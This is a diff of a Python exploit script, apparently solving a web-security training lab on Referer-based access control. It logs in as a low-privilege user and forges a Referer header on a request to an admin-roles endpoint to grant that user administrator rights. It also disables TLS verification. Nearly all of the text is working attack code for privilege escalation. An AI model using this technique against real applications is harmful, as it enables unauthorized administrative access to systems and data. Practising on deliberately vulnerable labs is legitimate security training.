@@ -1,8 +1,7 @@
-# Lab: Multi-step process with no access control on one step
+# Lab: Referer-based access control
 import os
 import requests
 import urllib3
-from bs4 import BeautifulSoup
 import sys
 from dotenv import load_dotenv
 
@@ -15,18 +14,9 @@ proxies = {
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 
-def get_csrf_token(s, url):
-    path = "/login"
-    r = s.get(url + path, verify=False, proxies=proxies)
-    soup = BeautifulSoup(r.text, 'html.parser')
-    csrf = soup.find("input", {'name': 'csrf'})['value']
-    return csrf
-
-
 def login(s, url):
     path = "/login"
-    csrf = get_csrf_token(s, url)
-    data = {"csrf": csrf, "username": "wiener", "password": "peter"}
+    data = {"username": "wiener", "password": "peter"}
     r = s.post(url + path, data=data, verify=False, proxies=proxies)
 
     if r.status_code == 200:
@@ -38,16 +28,16 @@ def login(s, url):
 
 def change_user_role(s, url):
     login(s, url)
-    admin_roles_path = "/admin-roles"
-    data = {"action": "upgrade", "confirmed": "true", "username": "wiener"}
-    r = s.post(url + admin_roles_path, data=data, verify=False, proxies=proxies)
+    admin_roles_path = "/admin-roles?username=wiener&action=upgrade"
+    header = {"Referer": url + "/admin"}
+    r = s.get(url + admin_roles_path, headers=header, verify=False, proxies=proxies)
+    print(r.text)
 
     if r.status_code == 200:
         print("(-> Successfully changed role from user to admin!!!")
     else:
         print("(-) Couldn't change role")
         exit(-1)
-
 
 
 def main():
@@ -58,6 +48,7 @@ def main():
 
     url = sys.argv[1]
     s = requests.Session()
+    print("(-> Referer-based access control")
     change_user_role(s, url)
 
 
